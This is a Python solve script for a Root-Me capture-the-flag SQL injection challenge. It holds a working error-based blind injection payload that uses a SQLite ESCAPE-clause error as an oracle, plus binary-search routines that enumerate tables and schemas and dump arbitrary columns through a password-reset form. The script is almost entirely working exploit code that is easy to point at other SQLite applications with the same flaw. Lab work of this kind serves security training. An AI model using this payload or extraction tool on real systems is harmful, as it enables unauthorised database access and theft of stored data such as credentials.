#!/usr/bin/env python3
"""
Root-Me Pro - SQL Injection - Error (Rootflix)
/forgot-password takes `username`, string-concatenated into a SQLite query.
No boolean channel in the response body (same success message always) but
errors ARE distinguishable: a 500 leaks raw SQLite errors.

Oracle: like('a','a', CASE WHEN (<cond>) THEN 'a' ELSE 'ab' END)
  -> ESCAPE clause with 1 char is valid            -> HTTP 200
  -> ESCAPE clause with 2 chars is a SQLite error   -> HTTP 500
     ("ESCAPE expression must be a single character")

Sequential requests are reliable; concurrency here corrupts results
(likely shared per-request state / rate limiting on the instance).
"""
import requests
import sys

TARGET = "https://instance-019fe94c-cf91-7069-92b8-354c6e95defe.challenges.root-me.pro"
URL = f"{TARGET}/forgot-password"

session = requests.Session()


def oracle(cond: str) -> bool:
    payload = f"admin' AND like('a','a', CASE WHEN ({cond}) THEN 'a' ELSE 'ab' END) -- "
    r = session.post(URL, data={"username": payload})
    return r.status_code == 200


def get_length(expr: str, max_len: int = 200) -> int:
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"length(({expr}))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo


def get_string(expr: str, length: int = None) -> str:
    if length is None:
        length = get_length(expr)
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle(f"unicode(substr(({expr}),{pos},1))>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        result += chr(lo)
        print(f"\r  [{result!r}]", end="", flush=True)
    print()
    return result


def get_count(expr: str) -> int:
    return get_length_generic(f"({expr})")


def get_length_generic(expr: str, max_len: int = 1000) -> int:
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"({expr})>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "tables"

    if mode == "sanity":
        print("1=1 ->", oracle("1=1"))
        print("1=2 ->", oracle("1=2"))

    elif mode == "tables":
        n = get_count("SELECT count(*) FROM sqlite_master WHERE type='table'")
        print(f"[*] {n} tables")
        for i in range(n):
            name = get_string(f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}")
            print(f"[+] table[{i}] = {name}")

    elif mode == "schema":
        # full CREATE TABLE statements, newline separated
        n = get_count("SELECT count(*) FROM sqlite_master WHERE type='table'")
        for i in range(n):
            sql = get_string(f"SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}")
            print(f"[+] schema[{i}]:\n{sql}\n")

    elif mode == "count":
        table = sys.argv[2]
        n = get_count(f"SELECT count(*) FROM {table}")
        print(f"[*] count({table}) = {n}")

    elif mode == "dump":
        table = sys.argv[2]
        col = sys.argv[3]
        n = get_count(f"SELECT count(*) FROM {table}")
        print(f"[*] {n} rows in {table}.{col}")
        for i in range(n):
            val = get_string(f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i}")
            print(f"[+] {table}.{col}[{i}] = {val}")

    elif mode == "raw":
        # generic: python3 solve.py raw "<subquery expr>"
        expr = sys.argv[2]
        print(get_string(expr))
